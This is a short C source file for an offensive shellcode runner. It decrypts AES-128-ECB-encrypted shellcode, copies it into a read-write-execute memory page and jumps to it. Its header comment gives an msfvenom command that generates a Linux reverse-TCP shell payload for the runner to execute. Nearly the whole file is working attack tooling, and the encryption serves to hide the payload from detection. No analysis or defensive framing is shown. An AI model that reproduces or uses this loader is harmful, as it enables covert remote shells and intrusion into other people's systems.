/*
 * shellcode-runner.c — AES-128-ECB decrypted shellcode executor
 *
 * Drop shellcode.bin in the project root and run make:
 *   msfvenom -p linux/x64/shell_reverse_tcp LHOST=... LPORT=... -f raw -o shellcode.bin
 *   make
 */

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <stdint.h>
#include <unistd.h>

#include "aes.h"        /* Hand-rolled AES-128-ECB decrypt */
#include "shellcode.h"  /* Generated: aes_key[], shellcode[], shellcode_len, plaintext_len */

int main(void) {
    /* Decrypt in place */
    int pt_len = aes_decrypt_ecb(shellcode, shellcode_len, aes_key, shellcode);
    if (pt_len < 0)
        return 1;

    /* Allocate RWX page */
    void *mem = mmap(NULL, (size_t)pt_len,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANON | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED)
        return 1;

    memcpy(mem, shellcode, (size_t)pt_len);

    /* Jump */
    ((void(*)())mem)();
    return 0;
}
